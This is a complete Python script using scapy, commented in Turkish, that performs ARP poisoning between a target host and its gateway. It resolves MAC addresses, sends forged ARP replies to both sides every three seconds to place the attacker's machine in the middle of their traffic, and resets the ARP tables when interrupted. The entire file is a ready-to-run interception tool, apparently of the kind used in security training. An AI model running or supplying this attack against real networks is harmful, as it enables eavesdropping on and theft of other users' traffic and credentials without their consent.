import scapy.all as scapy
import time
import argparse

# Verilen IP adresine ait MAC adresini döner
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)  # IP adresine ARP isteği
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Yayın adresine Ethernet paketi
    combined_packet = broadcast_packet / arp_request_packet  # Paketleri birleştir
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]  # Paketi gönder ve cevapları al
    return answered_list[0][1].hwsrc  # Dönen MAC adresini al

# Hedef IP'ye sahte ARP yanıtı göndererek ARP zehirleme yapar
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)  # Hedefin MAC adresini al
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)  # Sahte ARP cevabı oluştur
    scapy.send(arp_response, verbose=False)  # Cevabı gönder

# ARP tablosunu eski haline döndürür
def reset_operation(fooled_ip, modem_ip):
    fooled_mac = get_mac_address(fooled_ip)
    modem_mac = get_mac_address(modem_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=modem_ip, hwsrc=modem_mac)
    scapy.send(arp_response, verbose=False, count=6)  # ARP tablosunu düzeltmek için birden fazla gönderim yapılır

# Komut satırı argümanlarını alır
def get_user_input():
    parser = argparse.ArgumentParser(description="ARP Poisoning Script")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Enter target IP address")
    parser.add_argument("-m", "--modem", dest="modem_ip", required=True, help="Enter modem IP address")
    return parser.parse_args()

# Ana işlem
number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_modem_ip = user_ips.modem_ip

try:
    while True:
        arp_poisoning(user_target_ip, user_modem_ip)  # Hedefe sahte modem
        arp_poisoning(user_modem_ip, user_target_ip)  # Modem'e sahte hedef
        number += 2
        print("\rSending packets " + str(number), end="")  # Paket sayısını anlık göster
        time.sleep(3)  # Her 3 saniyede bir zehirleme yap

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_modem_ip)  # Hedefi düzelt
    reset_operation(user_modem_ip, user_target_ip)  # Modem'i düzelt
